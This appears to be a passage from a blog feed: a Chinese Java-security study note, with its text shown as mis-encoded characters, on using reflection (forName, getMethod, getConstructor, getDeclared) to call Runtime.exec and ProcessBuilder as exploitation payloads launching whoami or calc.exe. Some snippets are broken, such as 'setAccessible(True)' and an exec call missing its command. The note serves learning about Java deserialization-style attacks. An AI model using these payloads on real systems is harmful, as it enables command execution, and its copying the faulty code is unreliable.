    <content type="html"><![CDATA[<h1 id="tEXqB">åŸºç¡€çŸ¥è¯†</h1><p><strong>åå°„</strong>ï¼šåœ¨è¿è¡Œæ—¶æ ¹æ®ä¼ å…¥çš„å­—ç¬¦ä¸²æ¥å†³å®šæ‰§è¡Œå“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•</p><p><strong>åœ¨Javaå®‰å…¨ä¸­ï¼Œè¿™å››ä¸ªæ–¹æ³•å°¤ä¸ºé‡è¦</strong></p><ol><li><code>Class.forName()</code>:è·å–ä¸€ä¸ªç±»ï¼ˆä½œä¸ºå…¥å£ï¼‰</li><li><code>newInstance()</code>ï¼šå®ä¾‹åŒ–è¿™ä¸ªç±»ï¼Œç›¸å½“äº<code>new ClassName()</code>,å› ä¸ºæ™®é€šæ–¹æ³•å¿…é¡»æ˜¯ç”±å¯¹è±¡æ‰èƒ½ä½¿ç”¨</li><li><code>getMethod()</code>ï¼šè·å–ç±»ä¸­çš„æŸä¸ªå‡½æ•°ï¼ˆå…¬å…±çš„ï¼‰</li><li><code>invoke()</code>ï¼šæ‰§è¡Œè¿™ä¸ªå‡½æ•°</li></ol><p><strong>è·å–Classå¯¹è±¡çš„ä¸‰ç§æ–¹å¼ï¼š</strong></p><ol><li><code>obj.getclass()</code>ï¼šéœ€è¦æ‰‹é‡Œæœ‰äº†ä¸€ä¸ªå¯¹è±¡å®ä¾‹ï¼Œå¦‚<code>&quot;abc&quot;.getClass()</code></li><li><code>Test.class</code>: ä»£ç ç¼–è¯‘æ—¶å°±éœ€è¦å¼•å…¥è¿™ä¸ªç±»ï¼ˆé™æ€çš„ï¼‰</li><li><code>Class.forName(&quot;ç±»å&quot;)</code>ï¼šåªéœ€çŸ¥é“ç±»çš„åå­—ï¼Œå°±èƒ½è·å–ç±»</li></ol><hr><p><strong>å…³äºClass.forNameçš„ä¸€ä¸ªè¯¯åŒº</strong></p><p><strong>1. <strong><code>forName</code></strong> çš„é‡è½½</strong><br><code>Class.forName(&quot;String&quot;)</code> å®é™…ä¸Šæ˜¯è°ƒç”¨äº†ï¼š<br><code>Class.forName(&quot;String&quot;, true, currentLoader)</code></p><p>è¿™é‡Œçš„ <code>true</code> ä»£è¡¨å‚æ•° <code>initialize</code>ï¼ˆæ˜¯å¦åˆå§‹åŒ–ï¼‰ã€‚</p><p><strong>2. åˆå§‹åŒ–çš„çœŸæ­£å«ä¹‰</strong><br>å¾ˆå¤šäººä»¥ä¸ºâ€œåˆå§‹åŒ–â€ç­‰äºâ€œæ‰§è¡Œæ„é€ å‡½æ•°â€ï¼Œ<strong>è¿™æ˜¯é”™çš„</strong>ã€‚<br>æ–‡æ¡£é€šè¿‡ <code>TrainPrint</code> ç±»çš„å®éªŒè¯æ˜äº†æ‰§è¡Œé¡ºåºï¼š</p><ol><li><code>static &#123;&#125;</code>** (é™æ€ä»£ç å—)<strong>ï¼šåœ¨</strong>ç±»åˆå§‹åŒ–**æ—¶æ‰§è¡Œï¼ˆå³ <code>Class.forName</code> æ—¶ï¼‰ã€‚</li><li><code>&#123;&#125;</code>** (æ„é€ ä»£ç å—)<strong>ï¼šåœ¨</strong>å®ä¾‹åŒ–**å¯¹è±¡æ—¶æ‰§è¡Œï¼ˆå³ <code>newInstance</code> æ—¶ï¼‰ã€‚</li><li><code>public TrainPrint()</code>** (æ„é€ å‡½æ•°)<strong>ï¼šåœ¨</strong>å®ä¾‹åŒ–**å¯¹è±¡æ—¶æ‰§è¡Œï¼Œä¸”åœ¨ <code>&#123;&#125;</code> ä¹‹åã€‚</li></ol><p><strong>ç»“è®ºï¼š</strong><br>å½“è°ƒç”¨ <code>Class.forName(&quot;æŸå„ç±»&quot;)</code> æ—¶ï¼Œ<strong>ä¸éœ€è¦</strong>å®ä¾‹åŒ–è¯¥å¯¹è±¡ï¼ˆä¸éœ€è¦ <code>newInstance</code>ï¼‰ï¼Œè¯¥ç±»ä¸­çš„ <code>static &#123;&#125;</code> é™æ€ä»£ç å—å°±ä¼šè¢«ç«‹å³æ‰§è¡Œï¼</p><hr><p><strong>é‡è½½ï¼š</strong></p><p>Javaä¸­åŒä¸€ä¸ªæ–¹æ³•ï¼Œä½†æ˜¯æ¥æ”¶çš„å‚æ•°ä¸ä¸€æ ·ã€‚å¦‚åƒé¥­ï¼š</p><ol><li>åƒé¥­ï¼ˆæ— å‚æ•°ï¼‰ï¼šå»é£Ÿå ‚éšä¾¿åƒç‚¹</li><li>åƒé¥­ï¼ˆè‹¹æœï¼‰ï¼šæˆ‘è¦åƒè‹¹æœ</li><li>åƒé¥­ï¼ˆç‰›æ’+åˆ€å‰ï¼‰ï¼šæˆ‘è¦ç”¨åˆ€å‰åƒç‰›æ’</li></ol><p>è€Œä¸ºäº†æ–¹ä¾¿è®°å¿†ï¼Œä½ ä¸ç”¨å»è®°eatriceï¼Œeatappleï¼Œeatsteakï¼Œåªç”¨è®°eatå°±è¡Œï¼ŒJavaä¼šæ ¹æ®ä½ ä¼ çš„å‚æ•°è‡ªåŠ¨åˆ¤æ–­</p><p>æ¯”å¦‚Runtimeç±»çš„execæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Runtime</span> &#123;<br><br>    <span class="hljs-comment">// ç‰ˆæœ¬ 1ï¼šåªæ¥å—ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ˆæœ€ç®€å•çš„å‘½ä»¤ï¼‰</span><br>    <span class="hljs-comment">// æ¯”å¦‚ï¼šexec(&quot;calc.exe&quot;)</span><br>    <span class="hljs-keyword">public</span> Process <span class="hljs-title function_">exec</span><span class="hljs-params">(String command)</span> &#123; ... &#125;<br><br>    <span class="hljs-comment">// ç‰ˆæœ¬ 2ï¼šæ¥å—ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„</span><br>    <span class="hljs-comment">// æ¯”å¦‚ï¼šexec(new String[]&#123;&quot;echo&quot;, &quot;hello&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> Process <span class="hljs-title function_">exec</span><span class="hljs-params">(String[] cmdarray)</span> &#123; ... &#125;<br><br>    <span class="hljs-comment">// ç‰ˆæœ¬ 3ï¼šæ¥å—å‘½ä»¤ï¼Œè¿˜æ¥å—ç¯å¢ƒå˜é‡</span><br>    <span class="hljs-keyword">public</span> Process <span class="hljs-title function_">exec</span><span class="hljs-params">(String command, String[] envp)</span> &#123; ... &#125;<br><br>    <span class="hljs-comment">// ... è¿˜æœ‰å¥½å‡ ä¸ªç‰ˆæœ¬ ...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆè¦åœ¨åå°„ä¸­æé‡è½½ï¼Œå› ä¸ºåœ¨é€šè¿‡getMethodæ‹¿æ–¹æ³•æ—¶ï¼Œéœ€è¦ç²¾ç¡®æŒ‡å®šå‚æ•°ç±»å‹ï¼Œæ¥å‘Šè¯‰Javaä½ è¦çš„å“ªä¸ªç‰ˆæœ¬ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// é”™è¯¯å†™æ³•</span><br>Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;exec&quot;</span>); <br><span class="hljs-comment">//æ­£ç¡®å†™æ³•</span><br>getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class)<br></code></pre></td></tr></table></figure><hr><p><strong>å†…éƒ¨ç±»ï¼š</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// è¿™ä¸ªå°±æ˜¯ C1 (å¤–éƒ¨ç±»/è¢‹é¼ å¦ˆå¦ˆ)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">C1</span> &#123;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æˆ‘æ˜¯è¢‹é¼ å¦ˆå¦ˆï¼Œæˆ‘åœ¨è·‘&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// è¿™ä¸ªå°±æ˜¯ C2 (å†…éƒ¨ç±»/å°è¢‹é¼ )</span><br>    <span class="hljs-comment">// æ³¨æ„ï¼šå®ƒæ˜¯å†™åœ¨ C1 çš„å¤§æ‹¬å·é‡Œé¢çš„ï¼</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">C2</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sleep</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;æˆ‘æ˜¯å°è¢‹é¼ ï¼Œæˆ‘åœ¨ç¡è§‰&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ç¼–è¯‘æˆ.classæ–‡ä»¶ä¹‹åï¼ŒJavaä¼šç”ŸæˆC1.classå’ŒC1$C2.classè¿™2ä¸ªæ–‡ä»¶ï¼Œä½¿ç”¨$ä½œä¸ºä¸€ä¸ªè¿æ¥ç¬¦ã€‚</p><p>åœ¨åå°„è°ƒç”¨(<code>Class.forName</code>)æ—¶ï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥æœC2ï¼Œä¹Ÿä¸èƒ½æœC1.C2ï¼Œæˆ‘ä»¬è¦ä½¿ç”¨ç¼–è¯‘åçš„çœŸå®åå­—<code>Class.forName(&quot;com.example.C1$C2&quot;)</code></p><h1 id="TI7RW">åå°„</h1><h2 id="dFoXm">getMethod</h2><font style="color:rgb(51,51,51);">è·å¾—ç±»ä»¥åï¼Œæˆ‘ä»¬å¯ä»¥ç»§ç»­ä½¿ç”¨åå°„æ¥è·å–è¿™ä¸ªç±»ä¸­çš„å±æ€§ã€æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥å®ä¾‹åŒ–è¿™ä¸ªç±»ï¼Œå¹¶è°ƒç”¨æ–¹æ³•ã€‚</font>`<font style="color:rgb(51,51,51);">class.newInstance()</font>`<font style="color:rgb(51,51,51);">çš„ä½œç”¨å°±æ˜¯è°ƒç”¨è¿™ä¸ªç±»çš„æ— å‚æ„é€ å‡½æ•°ï¼Œè¿™ä¸ªæ¯”è¾ƒå¥½ç†è§£ã€‚ä¸è¿‡ï¼Œæˆ‘ä»¬æœ‰æ—¶å€™ åœ¨å†™æ¼æ´åˆ©ç”¨æ–¹æ³•çš„æ—¶å€™ï¼Œä¼šå‘ç°ä½¿ç”¨ newInstance æ€»æ˜¯ä¸æˆåŠŸï¼Œè¿™æ—¶å€™åŸå› å¯èƒ½æ˜¯ï¼š </font><p><font style="color:rgb(51,51,51);">1. ä½ ä½¿ç”¨çš„ç±»æ²¡æœ‰æ— å‚æ„é€ å‡½æ•° </font></p><p><font style="color:rgb(51,51,51);">2. ä½ ä½¿ç”¨çš„ç±»æ„é€ å‡½æ•°æ˜¯ç§æœ‰çš„</font></p><p>ä½¿ç”¨getMethodæ¥é€šè¿‡Runtimeç±»çš„execæ‰§è¡Œå‘½ä»¤</p><p>Runtimeæ˜¯ä¸€ä¸ªå•ä¾‹æ¨¡å¼ï¼Œä»–çš„æ„é€ å‡½æ•°æ˜¯ç§æœ‰çš„ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬ä¸èƒ½ç›´æ¥ç”¨<code>clazz.newInstance()</code>ï¼Œå› ä¸ºæ„é€ å‡½æ•°ä¸è®©ç”¨ï¼Œåªèƒ½é€šè¿‡é™æ€æ–¹æ³•<code>getRuntime()</code>ï¼Œè®©å®ƒæŠŠé€ å¥½çš„å”¯ä¸€å¯¹è±¡ç»™ä½ </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Runtime</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Runtime</span> <span class="hljs-variable">currentRuntime</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Runtime</span>();<br>    <br>    <span class="hljs-comment">// ç§æœ‰æ„é€ å‡½æ•°ï¼Œä¸è®©ä½ éšä¾¿ new</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Runtime</span><span class="hljs-params">()</span> &#123;&#125;<br><br>    <span class="hljs-comment">// å¼€æ”¾äº†ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œè®©ä½ è·å–é‚£ä¸ªå”¯ä¸€çš„å¯¹è±¡</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Runtime <span class="hljs-title function_">getRuntime</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> currentRuntime;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å†è¯´åˆ°execæ–¹æ³•ï¼Œexecæ–¹æ³•æ˜¯publicï¼Œä¸æ˜¯staticï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬ä¸èƒ½ç”¨Runtimeæ¥æ‰§è¡Œï¼Œè¦ç”¨ä¸€ä¸ªRuntimeçš„å¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//é”™è¯¯</span><br>Runtime.exec(<span class="hljs-string">&quot;whoami&quot;</span>)<br><span class="hljs-comment">//æ­£ç¡®</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Runtime</span>().exec(<span class="hljs-string">&quot;whoami&quot;</span>)<br></code></pre></td></tr></table></figure><p>é‚£æˆ‘ä»¬çš„æ€è·¯å°±æ˜ç™½äº†<code>Class.forName</code>æ‹¿åˆ°clazz -&gt;<code>getMethod</code>æ‹¿åˆ°<code>getRuntime</code>æ–¹æ³•-&gt;invokeæ‰§è¡ŒgetRuntimeå¾—åˆ°ä¸€ä¸ªå¯¹è±¡å®ä¾‹-&gt;getMethodæ‹¿åˆ°execæ–¹æ³•-&gt;invokeå¯¹å¯¹è±¡å®ä¾‹æ‰§è¡Œexecæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Class clazz=Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)<br>Method getruntime=clazz.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>)<br>Object rt=getruntime.invoke(clazz)<br>Method execmethod=clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>,String.class)<br>execmethod.invoke(rt,<span class="hljs-string">&quot;whoami&quot;</span>)<br></code></pre></td></tr></table></figure><p>å†™æˆä¸€è¡Œå°±æ˜¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Class clazz=Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)<br>clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>,String.class).invoke(<br>    clazz.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(clazz),<span class="hljs-string">&quot;whoami&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="DBoYf">getContructor</h2>ä¸€ä¸ªç±»æ²¡æœ‰æ— å‚æ„é€ æ–¹æ³•ï¼Œä¹Ÿæ²¡æœ‰ç±»ä¼¼å•ä¾‹æ¨¡å¼é‡Œçš„é™æ€æ–¹æ³•ï¼Œæˆ‘ä»¬æ€æ ·é€šè¿‡åå°„å®ä¾‹åŒ–è¯¥ç±»ï¼Ÿ<p><font style="color:rgb(51,51,51);">å¯ä»¥ä½¿ç”¨getConstructorã€‚ä¸getMethodç±»ä¼¼ï¼ŒgetConstructor æ¥æ”¶çš„å‚æ•°æ˜¯æ„é€ å‡½æ•°åˆ—è¡¨ç±»å‹ï¼Œå› ä¸ºæ„é€ å‡½æ•°ä¹Ÿæ”¯æŒé‡è½½ï¼Œ æ‰€ä»¥å¿…é¡»ç”¨å‚æ•°åˆ—è¡¨ç±»å‹æ‰èƒ½å”¯ä¸€ç¡®å®šä¸€ä¸ªæ„é€ å‡½æ•°ã€‚ è·å–åˆ°æ„é€ å‡½æ•°åï¼Œæˆ‘ä»¬ä½¿ç”¨ newInstance æ¥æ‰§è¡Œã€‚</font></p><p>æ¯”å¦‚å¦å¤–ä¸€ç§æ‰§è¡Œå‘½ä»¤çš„æ–¹å¼<code>&lt;font style=&quot;color:rgb(51,51,51);&quot;&gt;ProcessBuilder&lt;/font&gt;</code><font style="color:rgb(51,51,51);">ï¼Œé€šè¿‡åå°„è·å–å…¶æ„é€ å‡½æ•°ï¼Œç„¶åè°ƒç”¨startæ¥æ‰§è¡Œå‘½ä»¤</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>((ProcessBuilder)<br>clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="hljs-string">&quot;calc.exe&quot;</span>))).star<br><span class="hljs-title function_">t</span><span class="hljs-params">()</span>;<br></code></pre></td></tr></table></figure><p><font style="color:rgb(51,51,51);">ä½†æ˜¯åœ¨æ¼æ´ç¯å¢ƒé‡Œé¢ï¼Œé€šå¸¸ä¸æ”¯æŒè¿™ç§å†™æ³•ï¼Œæˆ–è€…æ²¡å¼•å…¥ProcessBuilderè¿™ä¸ªç±»ï¼Œæ²¡æ³•å¼ºè½¬ï¼Œæˆ‘ä»¬éœ€è¦è¿™æ ·å†™</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>clazz.getMethod(<span class="hljs-string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(<br>Arrays.asList(<span class="hljs-string">&quot;calc.exe&quot;</span>)));<br></code></pre></td></tr></table></figure><p><font style="color:rgb(51,51,51);">åˆ†å¼€å†™å°±æ˜¯è¿™æ ·</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// === ç¬¬ä¸€æ­¥ï¼šè·å–ç±» ===</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br><br>        <span class="hljs-comment">// === ç¬¬äºŒæ­¥ï¼šè·å–æ„é€ å‡½æ•° (è§£å†³æ²¡æœ‰æ— å‚æ„é€ çš„é—®é¢˜) ===</span><br>        <span class="hljs-comment">// å¯¹åº”æ–‡æœ¬ï¼šgetConstructor æ¥æ”¶çš„å‚æ•°æ˜¯æ„é€ å‡½æ•°åˆ—è¡¨ç±»å‹</span><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getConstructor(List.class);<br><br>        <span class="hljs-comment">// === ç¬¬ä¸‰æ­¥ï¼šå®ä¾‹åŒ–å¯¹è±¡ ===</span><br>        <span class="hljs-comment">// å¯¹åº”æ–‡æœ¬ï¼šè·å–åˆ°æ„é€ å‡½æ•°åï¼Œæˆ‘ä»¬ä½¿ç”¨ newInstance æ¥æ‰§è¡Œ</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">pb</span> <span class="hljs-operator">=</span> constructor.newInstance(Arrays.asList(<span class="hljs-string">&quot;calc.exe&quot;</span>));<br><br>        <span class="hljs-comment">// === ç¬¬å››æ­¥ï¼šæ‰§è¡Œ start æ–¹æ³• (è§£å†³ä¸èƒ½å¼ºåˆ¶ç±»å‹è½¬æ¢çš„é—®é¢˜) ===</span><br>        <span class="hljs-comment">// å¯¹åº”æ–‡æœ¬ï¼šé€šè¿‡ getMethod(&quot;start&quot;) è·å–åˆ° start æ–¹æ³•</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">startMethod</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;start&quot;</span>);<br>        <br>        <span class="hljs-comment">// å¯¹åº”æ–‡æœ¬ï¼šinvoke çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯ ProcessBuilder Object äº†</span><br>        startMethod.invoke(pb); <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><font style="color:rgb(51,51,51);">ProcessBuilderæœ‰ä¸¤ä¸ªæ„é€ å‡½æ•°ï¼š </font></p><ul><li><code>&lt;font style=&quot;color:rgb(51,51,51);&quot;&gt;public ProcessBuilder(List&lt;String&gt; command) &lt;/font&gt;</code></li><li><code>&lt;font style=&quot;color:rgb(51,51,51);&quot;&gt;public ProcessBuilder(String... command)&lt;/font&gt;</code></li></ul><p>å¦‚æœæˆ‘ä»¬è¦ç”¨ç¬¬äºŒä¸ªå¯å˜é•¿å‚æ•°(<code>...</code>è¡¨ç¤ºå¯å˜é•¿å‚æ•°)ï¼ŒJavaåœ¨ç¼–è¯‘æ—¶ï¼Œä¼šæŠŠå¯å˜é•¿å‚æ•°ç¼–è¯‘æˆä¸€ä¸ªæ•°ç»„ï¼Œæ‰€ä»¥<code>String[] names</code>å’Œ<code>String...names</code>æ˜¯ç­‰ä»·çš„ã€‚æ‰€ä»¥åœ¨åå°„ä¸­ï¼Œå°†<code>String[].class</code>ä¼ ç»™getConstructorå³å¯è·å–ç¬¬äºŒç§æ„é€ å‡½æ•°ã€‚ç”±äºnewInstanceæœ¬èº«æ¥å—çš„å‚æ•°ä¹Ÿæ˜¯ä¸€ä¸ªæ•°ç»„ï¼ŒäºŒè€…ä¸€å åŠ ï¼Œå°±å˜æˆäº†ä¸€ä¸ªäºŒç»´æ•°ç»„ã€‚ä¸¾ä¾‹æ¥è¯´ï¼š</p><ul><li><strong>ProcessBuilder</strong> è¯´ï¼šâ€œæˆ‘è¦ä¸€ç®±è‹¹æœï¼ˆæ•°ç»„ï¼‰ã€‚â€</li><li><strong>newInstance</strong> è¯´ï¼šâ€œæ‰€æœ‰è¦ä¼ ç»™åˆ«äººçš„ä¸œè¥¿ï¼Œéƒ½å¿…é¡»è£…åœ¨ç®±å­é‡Œç»™æˆ‘ï¼Œæˆ‘ä¼šæŠŠç®±å­æ‹†äº†å†ç»™åˆ«äººã€‚â€</li></ul><p>å¦‚æœä½ ç›´æ¥ç»™ newInstance <strong>â€œä¸€ç®±è‹¹æœâ€</strong>ï¼š<br>newInstance æ‹†å¼€ç®±å­ï¼Œæ‹¿å‡ºä¸€ä¸ª<strong>â€œè‹¹æœâ€</strong>ç»™ ProcessBuilderã€‚<br>ProcessBuilder æ€’äº†ï¼šâ€œæˆ‘è¦çš„æ˜¯ä¸€ç®±ï¼Œä½ ç»™æˆ‘ä¸€ä¸ªï¼Ÿâ€</p><p>æ‰€ä»¥ä½ å¿…é¡»ç»™ newInstance <strong>â€œä¸€ä¸ªè£…äº†ä¸€ç®±è‹¹æœçš„ç®±å­â€</strong>ï¼ˆäºŒç»´æ•°ç»„ï¼‰ï¼š<br>newInstance æ‹†å¼€å¤–é¢çš„å¤§ç®±å­ï¼Œæ‹¿å‡ºé‡Œé¢çš„<strong>â€œä¸€ç®±è‹¹æœâ€</strong>ç»™ ProcessBuilderã€‚<br>ProcessBuilder å¼€å¿ƒäº†ã€‚</p><p><font style="color:rgb(51,51,51);">payloadå¦‚ä¸‹</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(<span class="hljs-keyword">new</span><br><span class="hljs-title class_">String</span>[][]&#123;&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;&#125;)).start();<br></code></pre></td></tr></table></figure><p><font style="color:rgb(51,51,51);">å†™æˆåå°„å°±æ˜¯</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Class clazz=Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>clazz.getMethod(<span class="hljs-string">&quot;start&quot;</span>).invoke(clazz.getConstructor(<br>    String[].class).newInstance(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[][]&#123;&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;&#125;))<br></code></pre></td></tr></table></figure><h2 id="M6c8y">getDeclared</h2>ä¸ºäº†æ‰§è¡Œä¸€ä¸ªç§æœ‰çš„æ–¹æ³•æˆ–è€…æ„é€ æ–¹æ³•ï¼Œæˆ‘ä»¬éœ€è¦ç”¨åˆ°getDeclaredç³»åˆ—çš„æ–¹æ³•ã€‚æ¯”èµ·getMethodæ¥è¯´ï¼š<ul><li><code>getMethod</code>ç³»åˆ—æ–¹æ³•è·å–çš„æ˜¯å½“å‰ç±»ä¸­æ‰€æœ‰å…¬å…±æ–¹æ³•ï¼ŒåŒ…æ‹¬ä»çˆ¶ç±»ç»§æ‰¿çš„æ–¹æ³•</li><li><code>getDeclared</code>ç³»åˆ—æ–¹æ³•è·å–å½“å‰ç±»ä¸­å£°æ˜çš„æ–¹æ³•ï¼Œå†™åœ¨è¿™ä¸ªç±»é‡Œçš„ï¼ŒåŒ…æ‹¬ç§æœ‰çš„æ–¹æ³•ï¼Œä½†æ˜¯ä¸åŒ…å«çˆ¶ç±»é‡Œç»§æ‰¿çš„</li></ul><p>å› ä¸ºç§æœ‰æ–¹æ³•æˆ–è€…ç§æœ‰æ„é€ å‡½æ•°å—åˆ°ä¿æŠ¤ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡<code>setAccessible(True)</code>æ¥æŠŠè¿™ä¸ªé”ç»™ç ¸å¼€ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Class clazz=Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>Constructor m=clazz.getDeclaredConstructor();<br>m.setAccessible(True)<br>clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>,String.class).invoke(m.newInstance());<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
      <category>javasec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>javasec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æœªæ¥å±•æœ›</title>
